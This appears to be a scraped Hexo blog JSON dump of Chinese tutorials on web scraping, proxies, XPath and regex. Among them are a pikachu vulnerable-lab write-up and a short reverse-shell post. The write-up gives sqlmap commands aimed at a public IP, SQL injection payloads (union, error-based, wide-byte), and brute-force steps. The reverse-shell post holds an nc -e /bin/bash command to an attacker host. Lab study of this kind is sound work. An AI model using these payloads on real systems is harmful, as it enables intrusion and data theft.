123456789101112131415161718192021import requestsimport jsonheaders = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;&#125;url = &#x27;https://ifanyi.iciba.com/index.php?c=trans&amp;m=fy&amp;client=6&amp;auth_user=key_ciba&amp;sign=99730f3bf66b2582&#x27;data = &#123; &#x27;from&#x27;: &#x27;zh&#x27;, &#x27;to&#x27;: &#x27;en&#x27;, &#x27;q&#x27;: &#x27;lucky 是一个帅气的老师&#x27;&#125;res = requests.post(url, headers=headers, data=data)# print(res.status_code)# 返回的是json字符串 需要在进行转换为字典data = json.loads(res.content.decode(&#x27;UTF-8&#x27;))# print(type(data))print(data)print(data[&#x27;content&#x27;][&#x27;out&#x27;]) 1.3 小结在模拟登陆等场景，经常需要发送post请求，直接使用requests.post(url,data)即可 2、使用代理2.1 为什么要使用代理 让服务器以为不是同一个客户端在请求 防止我们的真实地址被泄露，防止被追究 2.2 理解使用代理的过程 2.3 理解正向代理和反向代理的区别（扩展） 通过上图可以看出： 正向代理：对于浏览器知道服务器的真实地址，例如VPN 反向代理：浏览器不知道服务器的真实地址，例如nginx 详细讲解： 正向代理是客户端与正向代理客户端在同一局域网，客户端发出请求，正向代理 替代客户端向服务器发出请求。服务器不知道谁是真正的客户端，正向代理隐藏了真实的请求客户端。反向代理：服务器与反向代理在同一个局域网，客服端发出请求，反向代理接收请求 ，反向代理服务器会把我们的请求分转发到真实提供服务的各台服务器Nginx就是性能非常好的反向代理服务器，用来做负载均衡 2.4 代理的使用 用法： 1requests.get(&quot;http://www.baidu.com&quot;, proxies = proxies) proxies的形式：字典 例如： 1234 proxies = &#123; &quot;http&quot;: &quot;http://12.34.56.79:9527&quot;, &quot;https&quot;: &quot;https://12.34.56.79:9527&quot;,&#125; 2.5 代理IP的分类根据代理ip的匿名程度，代理IP可以分为下面三类： 透明代理(Transparent Proxy)：透明代理的意思是客户端根本不需要知道有代理服务器的存在，但是它传送的仍然是真实的IP。使用透明代理时，对方服务器是可以知道你使用了代理的，并且他们也知道你的真实IP。你要想隐藏的话，不要用这个。透明代理为什么无法隐藏身份呢?因为他们将你的真实IP发送给了对方服务器，所以无法达到保护真实信息。 匿名代理(Anonymous Proxy)：匿名代理隐藏了您的真实IP，但是向访问对象可以检测是使用代理服务器访问他们的。会改变我们的请求信息，服务器端有可能会认为我们使用了代理。不过使用此种代理时，虽然被访问的网站不能知道你的ip地址，但仍然可以知道你在使用代理，当然某些能够侦测ip的网页也是可以查到你的ip。（https://wenku.baidu.com/view/9bf7b5bd3a3567ec102de2bd960590c69fc3d8cf.html） 高匿代理(Elite proxy或High Anonymity Proxy)：高匿名代理不改变客户机的请求，这样在服务器看来就像有个真正的客户浏览器在访问它，这时客户的真实IP是隐藏的，完全用代理服务器的信息替代了您的所有信息，就象您就是完全使用那台代理服务器直接访问对象，同时服务器端不会认为我们使用了代理。IPDIEA覆盖全球240＋国家地区ip高匿名代理不必担心被追踪。 在使用的使用，毫无疑问使用高匿代理效果最好 从请求使用的协议可以分为： http代理 https代理 socket代理等 不同分类的代理，在使用的时候需要根据抓取网站的协议来选择 2.6 代理IP使用的注意点 反反爬 使用代理ip是非常必要的一种反反爬的方式 但是即使使用了代理ip，对方服务器任然会有很多的方式来检测我们是否是一个爬虫，比如： 一段时间内，检测IP访问的频率，访问太多频繁会屏蔽 检查Cookie，User-Agent，Referer等header参数，若没有则屏蔽 服务方购买所有代理提供商，加入到反爬虫数据库里，若检测是代理则屏蔽 所以更好的方式在使用代理ip的时候使用随机的方式进行选择使用，不要每次都用一个代理ip 代理ip池的更新 购买的代理ip很多时候大部分(超过60%)可能都没办法使用，这个时候就需要通过程序去检测哪些可用，把不能用的删除掉。 代理服务器平台的使用： 当然还有很多免费的，但是大多都不可用需要自己尝试 http://www.66ip.cn https://ip.jiangxianli.com/?page=1 https://www.zdaye.com https://www.kuaidaili.com/free 3、配置 浏览器配置代理 右边三点=&#x3D;&gt; 设置=&#x3D;&gt; 高级=&#x3D;&gt; 代理=&#x3D;&gt; 局域网设置=&#x3D;&gt; 为LAN使用代理&#x3D;&#x3D;&gt; 输入ip和端口号即可 参考网址：https://jingyan.baidu.com/article/a681b0dece76407a1843468d.html 代码配置 urllib 123handler = urllib.request.ProxyHandler(&#123;&#x27;http&#x27;: &#x27;114.215.95.188:3128&#x27;&#125;)opener = urllib.request.build_opener(handler)# 后续都使用opener.open方法去发送请求即可 requests 12345678910111213141516171819202122232425# 用到的库import requests# 写入获取到的ip地址到proxy# 一个ip地址proxy = &#123; &#x27;http&#x27;:&#x27;http://221.178.232.130:8080&#x27;&#125;&quot;&quot;&quot;# 多个ip地址proxy = [ &#123;&#x27;http&#x27;:&#x27;http://221.178.232.130:8080&#x27;&#125;, &#123;&#x27;http&#x27;:&#x27;http://221.178.232.130:8080&#x27;&#125;]import randomproxy = random.choice(proxy)&quot;&quot;&quot;# 使用代理proxy = &#123; &#x27;http&#x27;: &#x27;http://58.20.184.187:9091&#x27;&#125;result = requests.get(&quot;http://httpbin.org/ip&quot;, proxies=proxy)print(result.text) 4、小结 requests发送post请求使用requests.post方法，带上请求体，其中请求体需要时字典的形式，传递给data参数接收 在requests中使用代理，需要准备字典形式的代理，传递给proxies参数接收 不同协议的url地址，需要使用不同的代理去请求","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"urllib与requests3","slug":"urllib与requests3","date":"2023-12-28T05:03:13.790Z","updated":"2023-12-28T06:29:02.159Z","comments":true,"path":"2023/12/28/urllib与requests3/","permalink":"http://example.com/2023/12/28/urllib%E4%B8%8Erequests3/","excerpt":"","text":"前情摘要一、web请求全过程剖析我们浏览器在输入完网址到我们看到网页的整体内容, 这个过程中究竟发生了些什么? 我们看一下一个浏览器请求的全过程 接下来就是一个比较重要的事情了. 所有的数据都在页面源代码里么? 非也~ 这里要介绍一个新的概念 那就是页面渲染数据的过程, 我们常见的页面渲染过程有两种, 服务器渲染, 你需要的数据直接在页面源代码里能搜到 这个最容易理解, 也是最简单的. 含义呢就是我们在请求到服务器的时候, 服务器直接把数据全部写入到html中, 我们浏览器就能直接拿到带有数据的html内容. 比如, 由于数据是直接写在html中的, 所以我们能看到的数据都在页面源代码中能找的到的. 这种网页一般都相对比较容易就能抓取到页面内容. 前端JS渲染, 你需要的数据在页面源代码里搜不到 这种就稍显麻烦了. 这种机制一般是第一次请求服务器返回一堆HTML框架结构. 然后再次请求到真正保存数据的服务器, 由这个服务器返回数据, 最后在浏览器上对数据进行加载. 就像这样: js渲染代码（示例） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;案例：动态渲染页面&lt;/title&gt; &lt;style&gt; table&#123; width: 300px; text-align: center; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;table border=&quot;1&quot; cellspacing=&quot;0&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;ID&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;!-- js渲染--&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;script&gt; //提前准备好的数据 var users = [ &#123;id: 1, name: &#x27;张三&#x27;, age: 18&#125;, &#123;id: 2, name: &#x27;李四&#x27;, age: 28&#125;, &#123;id: 3, name: &#x27;王麻子&#x27;, age: 38&#125; ] //获取tbody标签 var tbody = document.querySelector(&#x27;tbody&#x27;) //1.循环遍历users数据 users.forEach(function (item) &#123; //这里的item 就是数组中的每一个对象 console.log(item) //2. 每一个对象生成一个tr标签 var tr = document.createElement(&#x27;tr&#x27;) //循环遍历item for(var key in item)&#123; //生成td标签 var td = document.createElement(&#x27;td&#x27;) td.innerHTML = item[key] //5.把td 插入到tr内部 tr.appendChild(td) &#125; //把本次的tr插入到tbody的内部 tbody.appendChild(tr) &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这样做的好处是服务器那边能缓解压力. 而且分工明确. 比较容易维护. 典型的有这么一个网页 那数据是何时加载进来的呢? 其实就是在我们进行页面向下滚动的时候, jd就在偷偷的加载数据了, 此时想要看到这个页面的加载全过程, 我们就需要借助浏览器的调试工具了(F12) 看到了吧, 页面上看到的内容其实是后加载进来的. OK, 在这里我不是要跟各位讲jd有多牛B, 也不是说这两种方式有什么不同, 只是想告诉各位, 有些时候, 我们的数据不一定都是直接来自于页面源代码. 如果你在页面源代码中找不到你要的数据时, 那很可能数据是存放在另一个请求里. 121.你要的东西在页面源代码. 直接拿`源代码`提取数据即可2.你要的东西，不在页面源代码, 需要想办法找到真正的加载数据的那个请求. 然后提取数据 二、浏览器工具的使用Chrome是一款非常优秀的浏览器. 不仅仅体现在用户使用上. 对于我们开发人员而言也是非常非常好用的. 对于一名爬虫工程师而言. 浏览器是最能直观的看到网页情况以及网页加载内容的地方. 我们可以按下F12来查看一些普通用户很少能使用到的工具. 其中, 最重要的Elements, Console, Sources, Network. Elements是我们实时的网页内容情况, 注意, 很多兄弟尤其到了后期. 非常容易混淆Elements以及页面源代码之间的关系. 注意, 页面源代码是执行js脚本以及用户操作之前的服务器返回给我们最原始的内容 Elements中看到的内容是js脚本以及用户操作之后的当时的页面显示效果. 你可以理解为, 一个是老师批改之前的卷子, 一个是老师批改之后的卷子. 虽然都是卷子. 但是内容是不一样的. 而我们目前能够拿到的都是页面源代码. 也就是老师批改之前的样子. 这一点要格外注意. 在Elements中我们可以使用左上角的小箭头.可以直观的看到浏览器中每一块位置对应的当前html状况. 还是很贴心的. 第二个窗口, Console是用来查看程序员留下的一些打印内容, 以及日志内容的. 我们可以在这里输入一些js代码自动执行. 等咱们后面讲解js逆向的时候会用到这里. 第三个窗口, Source, 这里能看到该网页打开时加载的所有内容. 包括页面源代码. 脚本. 样式, 图片等等全部内容. 第四个窗口, Network, 我们一般习惯称呼它为抓包工具. 在这里, 我们能看到当前网页加载的所有网路网络请求, 以及请求的详细内容. 这一点对我们爬虫来说至关重要. 其他更加具体的内容. 随着咱们学习的展开. 会逐一进行讲解. 三、反爬虫的一般手段爬虫项目最复杂的不是页面信息的提取，反而是爬虫与反爬虫、反反爬虫的博弈过程 User-Agent 浏览器的标志信息，会通过请求头传递给服务器，用以说明访问数据的浏览器信息 反爬虫：先检查是否有UA，或者UA是否合法 代理IP 验证码访问 动态加载网页 数据加密 … 四、常见HTTP状态码 200：这个是最常见的http状态码，表示服务器已经成功接受请求，并将返回客户端所请 100-199 用于指定客户端应相应的某些动作。 200-299 用于表示请求成功。 300-399 用于已经移动的文件并且常被包含在定位头信息中指定新的地址信息。 400-499 用于指出客户端的错误。 404：请求失败，客户端请求的资源没有找到或者是不存在 500-599 服务器遇到未知的错误，导致无法完成客户端当前的请求。","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"xpath","slug":"xpath","date":"2023-12-28T04:53:07.411Z","updated":"2023-12-28T04:54:28.925Z","comments":true,"path":"2023/12/28/xpath/","permalink":"http://example.com/2023/12/28/xpath/","excerpt":"","text":"xpath1、xpath安装与使用安装 安装lxml库 pip install lxml -i pip源 2、解析流程与使用解析流程 实例化一个etree的对象，把即将被解析的页面源码加载到该对象 调用该对象的xpath方法结合着不同形式的xpath表达进行标签定位和数据提取 使用 导入lxml.etree from lxml import etree etree.parse() 解析本地html文件 html_tree &#x3D; etree.parse(‘XX.html’) etree.HTML()(建议) 解析网络的html字符串 html_tree &#x3D; etree.HTML(html字符串) html_tree.xpath() 使用xpath路径查询信息，返回一个列表 注意：如果lxml解析本地HTML文件报错可以安装如下添加参数 123parser = etree.HTMLParser(encoding=&quot;utf-8&quot;)selector = etree.parse(&#x27;./lol_1.html&#x27;,parser=parser)result=etree.tostring(selector) 3、xpath语法XPath 是一门在 XML 文档中查找信息的语言。XPath 用于在 XML 文档中通过元素和属性进行导航。 路径表达式 表达式 描述 &#x2F; 从根节点选取。 &#x2F;&#x2F; 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。 .&#x2F; 当前节点再次进行xpath @ 选取属性。 实例 在下面的表格中，我们已列出了一些路径表达式以及表达式的结果： 路径表达式 结果 &#x2F;html 选取根元素。注释：假如路径起始于正斜杠( &#x2F; )，则此路径始终代表到某元素的绝对路径！ &#x2F;&#x2F;li 选取所有li 子元素，而不管它们在文档中的位置。 &#x2F;&#x2F;ul&#x2F;&#x2F;li 选择属于 ul元素的后代的所有 li元素，而不管它们位于 ul之下的什么位置。 节点对象.xpath(‘.&#x2F;div’) 选择当前节点对象里面的第一个div节点 &#x2F;&#x2F;@href 选取名为 href 的所有属性。 谓语（Predicates） 谓语用来查找某个特定的节点或者包含某个指定的值的节点。 谓语被嵌在方括号中。 实例 在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果： 路径表达式 结果 &#x2F;ul&#x2F;li[1] 选取属于 ul子元素的第一个 li元素。 &#x2F;ul&#x2F;li[last()] 选取属于 ul子元素的最后一个 li元素。 &#x2F;ul&#x2F;li[last()-1] 选取属于 ul子元素的倒数第二个 li元素。 &#x2F;&#x2F;ul&#x2F;li[position()&lt;3] 选取最前面的两个属于 ul元素的子元素的 li元素。 &#x2F;&#x2F;a[@title] 选取所有拥有名为 title的属性的 a元素。 &#x2F;&#x2F;a[@title&#x3D;’xx’] 选取所有 a元素，且这些元素拥有值为 xx的 title属性。 &#x2F;&#x2F;a[@title&gt;10] &gt; &lt; &gt;= &lt;= != 选取 a元素的所有 title元素，且其中的 title元素的值须大于 10。 &#x2F;bookstore&#x2F;book[price&gt;35.00]&#x2F;title 选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。 选取未知节点 XPath 通配符可用来选取未知的 XML 元素。 通配符 描述 * 匹配任何元素节点。 一般用于浏览器copy xpath会出现 @* 匹配任何属性节点。 node() 匹配任何类型的节点。 实例 在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果： 路径表达式 结果 &#x2F;ul&#x2F;* 选取 ul元素的所有子元素。 &#x2F;&#x2F;* 选取文档中的所有元素。 &#x2F;&#x2F;title[@*] 选取所有带有属性的 title 元素。 &#x2F;&#x2F;node() 获取所有节点 选取若干路径 通过在路径表达式中使用“|”运算符，您可以选取若干个路径。 实例 在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果： 路径表达式 结果 &#x2F;&#x2F;book&#x2F;title | &#x2F;&#x2F;book&#x2F;price 选取 book 元素的所有 title 和 price 元素。 &#x2F;&#x2F;title | &#x2F;&#x2F;price 选取文档中的所有 title 和 price 元素。 &#x2F;bookstore&#x2F;book&#x2F;title | &#x2F;&#x2F;price 选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。 逻辑运算 查找所有id属性等于head并且class属性等于s_down的div标签 1//div[@id=&quot;head&quot; and @class=&quot;s_down&quot;] 选取文档中的所有 title 和 price 元素。 1//title | //price 注意: “|”两边必须是完整的xpath路径 属性查询 查找所有包含id属性的div节点 1//div[@id] 查找所有id属性等于maincontent的div标签 1//div[@id=&quot;maincontent&quot;] 查找所有的class属性 1//@class &#x2F;&#x2F;@attrName 1//li[@name=&quot;xx&quot;]//text() # 获取li标签name为xx的里面的文本内容 获取第几个标签 索引从1开始 123tree.xpath(&#x27;//li[1]/a/text()&#x27;) # 获取第一个tree.xpath(&#x27;//li[last()]/a/text()&#x27;) # 获取最后一个tree.xpath(&#x27;//li[last()-1]/a/text()&#x27;) # 获取倒数第二个 模糊查询 查询所有id属性中包含he的div标签 1//div[contains(@id, &quot;he&quot;)] 查询所有id属性中包以he开头的div标签 1//div[starts-with(@id, &quot;he&quot;)] 内容查询 查找所有div标签下的直接子节点h1的内容 1//div/h1/text() 属性值获取 1//div/a/@href 获取a里面的href属性值 获取所有 12//* #获取所有//*[@class=&quot;xx&quot;] #获取所有class为xx的标签 获取节点内容转换成字符串 123c = tree.xpath(&#x27;//li/a&#x27;)[0]result=etree.tostring(c, encoding=&#x27;utf-8&#x27;)print(result.decode(&#x27;UTF-8&#x27;))","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"pikachu靶场","slug":"pikachu靶场","date":"2023-12-27T13:19:27.780Z","updated":"2023-12-27T13:45:01.891Z","comments":true,"path":"2023/12/27/pikachu靶场/","permalink":"http://example.com/2023/12/27/pikachu%E9%9D%B6%E5%9C%BA/","excerpt":"","text":"暴力破解原理：暴力破解（是一种计算机安全攻击方法，其原理是通过尝试所有可能的密码组合，直到找到正确的密码为止。 1.基于表单的暴力破解 看到这个，再看到题目名字，直接使用burp中的爆破功能，我们抓取他登陆的包 然后导入我们的字典，开始爆破，成功得出账号密码分别是admin和123456 2.验证码绕过(on server)1.保持bp的抓包状态，随便输入账号和密码，先不输入验证码。 2.打开bp，右击选择send to repeater，把请求发送到 repeater 3.打开Repeater，点击GO,观察状态。 4.这时，右侧会显示验证码不能为空，因为此前没有输入验证码 5.如果随便输入一个验证码，此时显示验证码错误！ 6.然后把pikachu平台中的正确的验证码输入进去，则显示账号或密码错误！说明了后台会把提交的验证码进行验证，看是否正确，接下来进行暴力破解！ 7.然后把pikachu平台中的正确的验证码输入进去，则显示账号或密码错误！说明了后台会把提交的验证码进行验证，看是否正确，接下来进行暴力破解！步骤和基于表单的暴力破解是一样。将Proxy中抓到的，右击发送到Intruder，然后添加账户和密码变量，放入字典。 （第一题知道了他账号密码，所以就直接不上字典了） 3.验证码绕过(on click)验证码输入正确、为空、输入错误分别提示login success，请输入验证码，验证码输入错误。 什么都不输入或只输入用户名和密码点击登录，页面弹出“请输入验证码！”的提示框，而不是用户名和密码不存在 我们查看源码，输入的验证码在本地验证，我们可以在burp suite不输入验证码或者输入错的验证码完成爆破 burp suite抓包，删除验证码，发送到intruder模块 4.token防爆破？这一关增加的Token值，用来防止爆破，不过在多次抓包在之后，发现每次返回的数据中含有下一次的Token值 满足以上条件我们就可以使用burp的音叉攻击进行爆破，线程必须为1，参数为password和token password载荷设置： 上图中，第五步复制的value值放入下图中： 开始攻击 SQL-Inject1. 数字型注入提示提交方式为post，使用手注 使用bp抓包并发送到Repeater 判断列数为2 查库 查表 查列 查数据 可知密码通过md5加密，使用账号&#x2F;密码为admin&#x2F;123456 2.字符型注入提示为字符型，且提交方式为get，使用sqlmap 查询数据库 1sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; --dbs 查询数据表 1sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; -D pikachu --tables 查询数据表中的数据 1sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; -D pikachu -T users --dump 3.搜索型注入123456//手注Payload:&#x27; order by 3 # //爆回显位&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() # //爆数据表名&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users # //爆字段名&#x27; union select 1,username,password from users # //爆字段值 4.insert&#x2F;update注入1234//sqlmapPayload:sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_iu/sqli_reg.php&quot; --data=&quot;username=1111&amp;password=1&amp;sex=1&amp;phonenum=1&amp;email=1&amp;add=1&amp;submit=submit&quot; --dbs余下步骤与第二题一样 5.delete注入12345//在bp中手注（报错注入）//手注Payload:and updatexml(1,concat(0x7e,(select database()),0x7e),1) //查询库//余下步骤与第七题一样 7.http头注入12345678//在bp中手注（报错注入）//手注Payload:1&#x27; update(0,concat(0x7b,database()),1) or &#x27; //查库&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),1,31)),1) or &#x27; //查表&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31)),1) or &#x27; //查字段名&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(username,&#x27;:&#x27;,password) from users),1,31)),1) or &#x27; //查字段值//报错误注入会限制整数，可修改查询语句来查询未查询信息 8.基于boolian的盲注12345//（布尔盲注通过页面返回的True或False来判断）//sqlmapPayload:sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_blind_b.php?name=ad&amp;submit=%E6%9F%A5%E8%AF%A2&quot; –dbs//余下步骤与第二题一样 9.基于时间的盲注12345//(时间盲注通过页面回应时间来判断)//sqlmapPayload:sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_blind_t.php?name=ad&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --dbs //余下步骤与第二题一样 10.wide byte注入1234567//在bp中手注///Payload: name=kobe%df’ union select 1,database() # //查库name=1%df’ union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2# //查表name=1%df’ union select (select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1)),2# //查字段名name=1%df’ union select (select group_concat(username,0x3b,password) from test.users),2#//查字段内容 RCE1. exec “ping”输入框相当与linux终端 可以利用反shell控制（需要内网穿透）、上传木马 2.exec “eval”输入框将用户输入的字符串当做php脚本了解析执行 可以利用system()函数反shell连接（需要内网穿透）或者上传木马通过中国蚁剑连接","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"靶场","slug":"安全/网络渗透测试/靶场","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"反弹shell","slug":"反弹shell","date":"2023-12-27T12:44:27.860Z","updated":"2023-12-28T12:47:49.601Z","comments":true,"path":"2023/12/27/反弹shell/","permalink":"http://example.com/2023/12/27/%E5%8F%8D%E5%BC%B9shell/","excerpt":"","text":"nc连接攻击机 1nc -lvp [端口] 靶机 12nc -e /bin/bash 192.168.1.105 19111// 攻击机ip 端口","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"正则","slug":"正则","date":"2023-12-26T04:51:20.920Z","updated":"2023-12-26T04:53:26.023Z","comments":true,"path":"2023/12/26/正则/","permalink":"http://example.com/2023/12/26/%E6%AD%A3%E5%88%99/","excerpt":"","text":"一、正则基础1、为什么使用正则 需求 判断一个字符串是否是手机号 解决 编写一个函数，给函数一个字符串，如果是手机号则返回True，否则返回False 代码 12345678910def isPhone(phone): # 长度为11 # 全部都是数字字符 # 以1开头 passif isPhone(&quot;13812345678&quot;): print(&quot;是手机号&quot;)else: print(&quot;不是手机号&quot;) 注意 如果使用正则会让这个问题变得简单 2、正则与re模块简介概述： 正则表达式，又称规则表达式 正则表达式(regular expression)描述了一种字符串匹配的模式（pattern） 正则匹配是一个 模糊的匹配(不是精确匹配) re：python自1.5版本开始增加了re模块，该模块提供了perl风格的正则表达式模式，re模块是python语言拥有了所有正则表达式的功能 如下四个方法经常使用 match() search() findall() finditer() 二、正则表达式1、匹配单个字符与数字 匹配 说明 . 匹配除换行符以外的任意字符，当flags被设置为re.S时，可以匹配包含换行符以内的所有字符 [] 里面是字符集合，匹配[]里任意一个字符 [0123456789] 匹配任意一个数字字符 [0-9] 匹配任意一个数字字符 [a-z] 匹配任意一个小写英文字母字符 [A-Z] 匹配任意一个大写英文字母字符 [A-Za-z] 匹配任意一个英文字母字符 [A-Za-z0-9] 匹配任意一个数字或英文字母字符 [^lucky] []里的^称为脱字符，表示非，匹配不在[]内的任意一个字符 ^[lucky] 以[]中内的某一个字符作为开头 \\d 匹配任意一个数字字符，相当于[0-9] \\D 匹配任意一个非数字字符，相当于[^0-9] \\w 匹配字母、下划线、数字中的任意一个字符，相当于[0-9A-Za-z_] \\W 匹配非字母、下划线、数字中的任意一个字符，相当于[^0-9A-Za-z_] \\s 匹配空白符(空格、换页、换行、回车、制表)，相当于[ \\f\\n\\r\\t] \\S 匹配非空白符(空格、换页、换行、回车、制表)，相当于[^ \\f\\n\\r\\t] 2、匹配锚字符锚字符:用来判定是否按照规定开始或者结尾 匹配 说明 ^ 行首匹配，和[]里的^不是一个意思 $ 行尾匹配 3、限定符限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 匹配 说明 (xyz) 匹配括号内的xyz，作为一个整体去匹配 一个单元 子存储 x? 匹配0个或者1个x，非贪婪匹配 x* 匹配0个或任意多个x x+ 匹配至少一个x x{n} 确定匹配n个x，n是非负数 x{n,} 至少匹配n个x x{n,m} 匹配至少n个最多m个x x|y |表示或的意思，匹配x或y 三、re模块中常用函数通用flags（修正符） 值 说明 re.I 是匹配对大小写不敏感 re.S 使.匹配包括换行符在内的所有字符 通用函数 获取匹配结果 使用group()方法 获取到匹配的值 groups() 返回一个包含所有小组字符串的元组(也就是自存储的值)，从 1 到 所含的小组号。 1、match()函数 原型 1def match(pattern, string, flags=0) 功能 匹配成功返回 匹配的对象 匹配失败 返回 None 获取匹配结果 使用group()方法 获取到匹配的值 groups() 返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。 注意：从第一位开始匹配 只匹配一次 参数 参数 说明 pattern 匹配的正则表达式(一种字符串的模式) string 要匹配的字符串 flags 标识位，用于控制正则表达式的匹配方式 代码 12345678910import reres = re.match(&#x27;\\d&#123;2&#125;&#x27;,&#x27;123&#x27;)print(res.group())#给当前匹配到的结果起别名s = &#x27;3G4HFD567&#x27;re.match(&quot;(?P&lt;value&gt;\\d+)&quot;,s)print(x.group(0))print(x.group(&#x27;value&#x27;)) 2、searce()函数 原型 1def search(pattern, string, flags=0) 功能 扫描整个字符串string，并返回第一个pattern模式成功的匹配 匹配失败 返回 None 参数 参数 说明 pattern 匹配的正则表达式(一种字符串的模式) string 要匹配的字符串 flags 标识位，用于控制正则表达式的匹配方式 注意： 只要字符串包含就可以 只匹配一次 示例 12345import reres = re.search(&#x27;[a-z]&#x27;, &#x27;131A3ab889s&#x27;)print(res)print(res.group() 注意 与search的区别 相同点： 都只匹配一次 不同点： search是在要匹配的字符串中 包含正则表达式的内容就可以 match 必须第一位就开始匹配 否则匹配失败 3、findall()函数（返回列表） 原型 1def findall(pattern, string, flags=0) 功能 扫描整个字符串string，并返回所有匹配的pattern模式结果的字符串列表 参数 参数 说明 pattern 匹配的正则表达式(一种字符串的模式) string 要匹配的字符串 flags 标识位，用于控制正则表达式的匹配方式 示例 12345678910111213141516171819202122232425myStr = &quot;&quot;&quot;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&lt;A href=&quot;http://www.taobao.com&quot;&gt;淘宝&lt;/A&gt;&lt;a href=&quot;http://www.id97.com&quot;&gt;电影网站&lt;/a&gt;&lt;i&gt;我是倾斜1&lt;/i&gt;&lt;i&gt;我是倾斜2&lt;/i&gt;&lt;em&gt;我是倾斜2&lt;/em&gt;&quot;&quot;&quot;# html里是不区分大小写# （1）给正则里面匹配的 加上圆括号 会将括号里面的内容进行 单独的返回res = re.findall(&quot;(&lt;a href=\\&quot;http://www\\.(.*?)\\.com\\&quot;&gt;(.*?)&lt;/a&gt;)&quot;,myStr) #[(&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;, &#x27;baidu&#x27;, &#x27;百度&#x27;)]# 括号的区别res = re.findall(&quot;&lt;a href=\\&quot;http://www\\..*?\\.com\\&quot;&gt;.*?&lt;/a&gt;&quot;,myStr) 